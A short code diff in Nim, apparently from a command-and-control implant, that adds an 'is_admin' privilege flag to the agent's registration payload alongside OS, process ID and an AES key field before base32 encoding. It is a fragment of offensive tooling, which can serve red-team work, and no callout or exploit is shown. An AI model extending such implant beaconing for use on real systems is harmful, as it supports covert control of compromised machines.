@@ -240,6 +240,7 @@ proc register*(t: var AgentTransport): bool =
     "os":       "windows/amd64",
     "pid":      pid,
     "aes_key":  "",
+    "is_admin": isElevated(),
     "language": "nim"
   }
   let encoded = b32Encode(cast[seq[byte]]($payload))
